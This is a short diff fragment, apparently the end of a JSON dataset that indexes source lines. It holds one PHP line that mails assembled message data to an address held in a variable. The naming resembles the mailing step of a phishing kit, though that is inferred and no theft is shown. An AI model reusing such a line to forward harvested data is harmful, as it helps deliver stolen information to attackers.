+            "146": "$mail = mail($email_go, $assunto.$data, $mensagem.$boundary.$destino, $headers);"
+          }
+        }
+      ]
+    }
+  ]
+}
